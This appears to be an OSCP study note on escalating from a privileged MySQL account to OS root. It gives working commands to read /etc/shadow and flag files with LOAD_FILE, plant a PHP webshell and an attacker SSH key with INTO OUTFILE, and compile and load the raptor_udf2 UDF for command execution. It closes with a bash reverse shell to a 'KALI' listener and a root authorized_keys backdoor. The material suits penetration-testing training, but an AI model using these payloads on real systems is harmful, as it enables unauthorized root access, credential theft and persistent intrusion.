---
title: "MySQL Privilege Escalation"
slug: mysql-privilege-escalation
category: notes
handbook: oscp
tags: ["privilege-escalation", "databases"]
draft: false
pubDatetime: 2026-07-18T17:48:53+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "A MySQL account with high privileges is a path to the operating system."
---
A MySQL account with high privileges is a path to the operating system. "root" in MySQL is the database administrator, a separate thing from OS root. Anything reached through MySQL runs as the OS user that `mysqld` runs as, commonly `mysql`, sometimes `root` when the service is misconfigured.

MySQL access converts to OS access along three routes, in rough order of cost. Only the last one uses a UDF:

1. **Read files** with `LOAD_FILE`. Needs the `FILE` privilege.
2. **Write files** with `INTO OUTFILE` or `INTO DUMPFILE`. Needs the `FILE` privilege.
3. **Run commands** with a user-defined function. Needs `FILE` and write access to the `mysql` schema.

Reading one file is far cheaper than a full shell, so pick the route that matches the goal.

The `FILE` privilege and `secure_file_priv` gate all three. Check the ground first:

```sql
SELECT user(), current_user();
SELECT @@version, @@version_compile_os, @@plugin_dir, @@secure_file_priv;
SHOW GRANTS;
```

`secure_file_priv` decides where file reads and writes are allowed: empty means anywhere, a path means only under that path, `NULL` means file operations are disabled entirely (which rules out routes 1 and 2, and the UDF write in route 3).

## Read Files: LOAD_FILE

No exploit and no UDF, just the `FILE` privilege:

```sql
SELECT LOAD_FILE('/root/proof.txt');
SELECT LOAD_FILE('/etc/shadow');
```

`LOAD_FILE` returns the contents only if two conditions both hold: the `mysqld` OS user can reach the file, and the file is **world-readable** (`o+r`). The second is a MySQL-level rule independent of the OS user's privileges, and it is a common source of a confusing `NULL`:

- `/root/proof.txt` (mode 644) reads fine.
- `/etc/shadow` (mode 640) returns `NULL` even when `mysqld` runs as root, purely because it is not world-readable.

So a `NULL` does not by itself prove a lack of privilege. And reading any file under `/root` at all (given `/root` is normally traversable only by root) is strong evidence that `mysqld` runs as root. `secure_file_priv` must also not block the path.

## Write Files: INTO OUTFILE

The same privilege writes files, and this is often a faster foothold than a UDF when a useful, writable target path is known:

```sql
-- webshell into a web root
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/s.php';

-- an attacker key into a user's authorized_keys
SELECT 'ssh-rsa AAAA... attacker' INTO OUTFILE '/home/oscp/.ssh/authorized_keys';
```

`INTO OUTFILE` will not overwrite an existing file, and the write lands as the `mysqld` OS user, so the target directory has to be writable by that user. `INTO DUMPFILE` writes raw bytes with no formatting, which is what the UDF route uses to place a binary.

## Run Commands: UDF

To run OS commands, install a user-defined function (UDF) that wraps C `system()`. A UDF is a normal MySQL feature: SQL can be extended with functions written in C and loaded from a compiled shared library placed in the plugin directory. This route abuses the feature, not a bug, by loading a library whose functions run OS commands. The command runs as the `mysqld` OS user, so if `mysqld` is root, this is a direct root escalation.

### Requirements

- A MySQL account with `FILE` privilege and `INSERT` rights on the `mysql` schema (that is what installing a UDF requires).
- Write access to the plugin directory (`@@plugin_dir`).
- `secure_file_priv` empty, or set to the plugin directory.

### Get the library: compile it yourself

Precompiled `.so` files ship with sqlmap and Metasploit, but both tools are restricted in the OSCP exam, and a Metasploit-shipped artifact is a gray area not worth the risk. Compiling the library yourself is the clean, exam-safe method and is the canonical manual approach. `raptor_udf2.c` (EDB 1518) is the classic source, and exports one function, `do_system()`:

```bash
searchsploit -m 1518            # raptor_udf2.c
gcc -g -c raptor_udf2.c         # add -fPIC if it complains
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
xxd -p raptor_udf2.so | tr -d '\n'
```

Compiling on the attacker is fine as long as its architecture matches the target (both 64-bit is the common case). The `xxd` output is the whole `.so` as one hex string. Extracting a precompiled library's hex is really just using it as a data blob, but compiling it locally removes any doubt and demonstrates the technique. Note the `binascii.hexlify` in MySQL exploit scripts is doing exactly this hex step.

### Load it and run commands

Write the hex into the plugin directory with `INTO DUMPFILE` (raw bytes, no formatting), register the function, and call it:

```sql
SELECT 0x<hex> INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('id > /tmp/o 2>&1');
```

`do_system` returns the command's exit code (`0` on success), not its output. To read output back, write it to a file and `LOAD_FILE` it, but remember `LOAD_FILE` only returns world-readable files, so `chmod` it first:

```sql
SELECT do_system('id > /tmp/o 2>&1; chmod 644 /tmp/o');
SELECT LOAD_FILE('/tmp/o');
```

`uid=0(root)` confirms `mysqld` runs as root and every `do_system` call is a root command.

### Output-returning variant

`lib_mysqludf_sys` (the raptor sibling) exports `sys_exec` (returns the exit code) and `sys_eval` (returns stdout directly, no file or `chmod` needed). Compile it the same way if returning output through the query is worth the extra dependency. `do_system` plus a file and `chmod` avoids it.

### If the function does not exist

A call may fail with `ERROR 1046 (3D000): No database selected` when the session has no default database. Select any and retry:

```sql
USE mysql;
SELECT do_system('id');
```

The `1046` says nothing about the function, only that no schema was selected to resolve the call. Once a database is selected, the real state shows: either the result, or `ERROR 1305 (42000): FUNCTION ... does not exist` if the UDF was never registered. A `1305` means the `.so` write or `CREATE FUNCTION` did not succeed, most often a `secure_file_priv` block, a wrong `@@plugin_dir` path, or an architecture-mismatched `.so`. Confirm what is registered:

```sql
SELECT * FROM mysql.func;
```

## From Command Execution to a Shell

The UDF call runs through C `system()`, which uses `/bin/sh`. On Debian and Ubuntu that is dash, where a bare `>&` reverse shell fails with `Bad fd number`, so wrap the payload in bash:

```sql
SELECT do_system('bash -c "bash -i >& /dev/tcp/KALI/3305 0>&1"');
```

Catch it on a listener as in [Reverse Shells](/collections/oscp/reverse-shells). Two things decide whether it lands:

- **Egress**: the callback port has to be allowed outbound. On Pebbles a shell on `3305` connected, so match the port to what the firewall permits rather than defaulting to an arbitrary high port.
- **The OS user**: the shell runs as whoever `mysqld` is. If that is root, this is the full escalation; if it is `mysql`, enumerate again from there.

When outbound is heavily filtered, skip the reverse shell: `do_system` runs as root, so create `/root/.ssh` and drop an authorized key, then log in over SSH (inbound, no egress needed). That also fixes the case where `INTO OUTFILE` alone could not create `/root/.ssh`, since it cannot `mkdir` but `do_system` can.

## Choosing a Route

For a flag, `LOAD_FILE` or `sys_eval` is the fastest read. To turn a web-facing box, a webshell or key via `INTO OUTFILE` can be quicker than building a UDF. For real work on the target, take the shell, because enumeration and pivoting are painful one query at a time. The shell is usually worth the extra step even when the flag is already in hand.
